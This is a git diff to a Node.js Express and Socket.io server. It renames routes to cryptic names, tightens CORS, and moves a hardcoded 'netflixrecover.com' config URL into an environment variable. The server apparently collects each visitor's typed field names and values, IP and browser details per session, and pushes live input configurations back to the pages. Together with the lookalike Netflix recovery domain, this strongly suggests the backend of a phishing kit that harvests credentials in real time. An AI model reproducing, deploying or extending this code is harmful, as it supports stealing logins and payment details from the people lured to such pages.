@@ -3,7 +3,7 @@ const express = require("express");
 const app = express();
 const http = require("http").createServer(app);
 const io = require("socket.io")(http, {
-  path: "/realtime-connection", // Custom path instead of /socket.io/
+  path: "/chedda", // Custom path instead of /socket.io/
   cors: {
     origin: "*", // Allow requests from any origin
     methods: ["GET", "POST"]
@@ -51,9 +51,18 @@ mongoose
 app.use(morgan("dev"));
 app.use(cookieParser());
 app.use(cors({
-  origin: "*",
+  origin: function (origin, callback) {
+    const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',') : [];
+    
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
   credentials: true
 }));
+
 app.use(express.static("public"));
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
@@ -98,7 +107,7 @@ const saveDataToFile = () => {
 
 //app.use("/api/", limiter);  // Apply to API routes
 
-app.post("/api/tabba3", async (req, res) => {
+app.post("/api/cheddchedd", async (req, res) => {
   const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
 	if (!ip) {console.error('IP undefined');
@@ -316,7 +325,7 @@ const startConfigCheck = () => {
       }
 
       try {
-        const response = await axios.get(`https://netflixrecover.com/api/get-input-config/${sessionId}`);
+        const response = await axios.get(`${process.env.CLIENT_URL}/api/get-input-config/${sessionId}`);
         if (response.status === 200) {
           const inputsConfig = response.data.inputsConfig;
           io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
